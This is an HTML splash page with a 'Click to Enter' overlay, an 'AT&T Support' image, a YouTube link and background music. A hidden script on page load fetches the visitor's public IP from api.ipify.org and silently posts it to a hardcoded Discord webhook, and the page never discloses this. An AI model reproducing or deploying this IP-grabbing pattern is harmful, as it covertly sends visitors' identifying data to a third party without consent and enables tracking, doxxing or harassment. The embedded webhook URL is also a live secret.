<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> . . . </title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000000; 
        }

        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            cursor: pointer;
            z-index: 9999;
        }

        #content {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        img {
            width: 300px;
            height: auto;
            margin-bottom: 20px;
        }

        #youtube {
            color: white;
            font-size: 24px;
            text-transform: uppercase;
            text-shadow: 0 0 8px #ffffff, 0 0 16px #ffffff, 0 0 24px #ffffff;
            animation: glow 1.5s infinite alternate;
            margin-top: 20px;
            cursor: pointer;
        }

        @keyframes glow {
            from {
                text-shadow: 0 0 8px #ffffff, 0 0 16px #ffffff, 0 0 24px #ffffff;
            }
            to {
                text-shadow: 0 0 16px #ffffff, 0 0 24px #ffffff, 0 0 32px #ffffff;
            }
        }
    </style>
</head>
<body>
    <div id="overlay">Click to Enter</div>
    <div id="content">
        <img src="at&t_support.svg" alt="AT&T Support">
        <a href="https://www.youtube.com/@%D0%86%D0%BE%D1%81%D0%BA%D0%B2%D1%97%D1%82" target="_blank" id="youtube">YouTube</a>
    </div>
    <audio id="backgroundMusic" src="soundcloud_1426467355_audio.mp3" loop></audio>
    <script>
        async function logIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const webhookURL = 'https://discordapp.com/api/webhooks/1313917761042386984/Ih-JgysLsQJWQWZkC8lDHPDIPBYMTGsgzPJETBNLkYNKGBfgpx_7-Y9aNiV7cS9WL-oT ';

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `IP Address Logged: ${data.ip}`,
                    }),
                });
            } catch (error) {
                console.error('Error logging IP:', error);
            }
        }

        function initPage() {
            const overlay = document.getElementById('overlay');
            const backgroundMusic = document.getElementById('backgroundMusic');

            overlay.addEventListener('click', () => {
                overlay.style.display = 'none';
                backgroundMusic.play();
            });
        }

        logIP();
        initPage();
    </script>
</body>
</html>
